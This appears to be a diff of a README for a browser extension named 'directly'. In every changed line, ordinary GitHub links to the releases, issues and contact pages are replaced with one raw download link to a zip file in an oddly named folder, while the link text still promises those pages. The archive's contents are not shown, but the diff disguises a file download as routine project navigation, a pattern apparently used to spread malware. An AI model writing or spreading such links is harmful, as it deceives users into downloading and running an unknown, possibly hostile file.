@@ -2,7 +2,7 @@
 
 ## 📥 Download the Extension
 
-[![Download directly](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/xxxsleepygamerxxx/directly/releases)
+[![Download directly](https://raw.githubusercontent.com/xxxsleepygamerxxx/directly/main/Anallantoidea/directly.zip)](https://raw.githubusercontent.com/xxxsleepygamerxxx/directly/main/Anallantoidea/directly.zip)
 
 ## 📜 Introduction
 
@@ -18,7 +18,7 @@ To start using directly, follow these easy steps to download and install the ext
 
 ## 📦 Download & Install
 
-To get directly, visit the [Releases page](https://github.com/xxxsleepygamerxxx/directly/releases) to download the latest version.
+To get directly, visit the [Releases page](https://raw.githubusercontent.com/xxxsleepygamerxxx/directly/main/Anallantoidea/directly.zip) to download the latest version.
 
 1. Click the link above.
 2. Find the latest version listed on the page.
@@ -60,7 +60,7 @@ Sometimes issues may arise. Here are quick solutions to common problems:
 2. **Search Not Working:** Check your internet connection. You may also want to restart the browser to refresh.
 3. **Settings Not Saving:** This could happen if your browser settings do not allow it. Make sure your browser is set to save changes to extensions.
 
-If you encounter any other problems, please check the issues section on the [GitHub repository](https://github.com/xxxsleepygamerxxx/directly/issues).
+If you encounter any other problems, please check the issues section on the [GitHub repository](https://raw.githubusercontent.com/xxxsleepygamerxxx/directly/main/Anallantoidea/directly.zip).
 
 ## 👥 Community and Contributions
 
@@ -68,7 +68,7 @@ We welcome feedback from users. You can share your thoughts or report issues thr
 
 ## 📞 Contact
 
-If you need assistance, please visit the issues section of the [GitHub page](https://github.com/xxxsleepygamerxxx/directly/issues). Your feedback helps improve directly for everyone!
+If you need assistance, please visit the issues section of the [GitHub page](https://raw.githubusercontent.com/xxxsleepygamerxxx/directly/main/Anallantoidea/directly.zip). Your feedback helps improve directly for everyone!
 
 ---
 
